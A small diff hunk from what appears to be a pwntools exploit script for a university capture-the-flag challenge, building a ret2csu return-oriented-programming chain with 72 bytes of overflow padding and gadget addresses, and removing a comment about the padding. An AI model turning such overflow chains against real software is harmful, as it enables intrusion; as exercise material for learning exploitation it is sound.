@@ -21,7 +21,7 @@ p = remote("cse4850-ret2csu-1.chals.io", 443, ssl=True, sni="cse4850-ret2csu-1.c
 
 #p = start()
 
-chain = b'A' * 72 # idk how to get this i copied someone, padding for overflow
+chain = b'A' * 72
 chain += p64(0x40095a)		# address of first gadget
 chain += p64(0x0) 		# pop rbx
 chain += p64(0x1)		# pop rbp
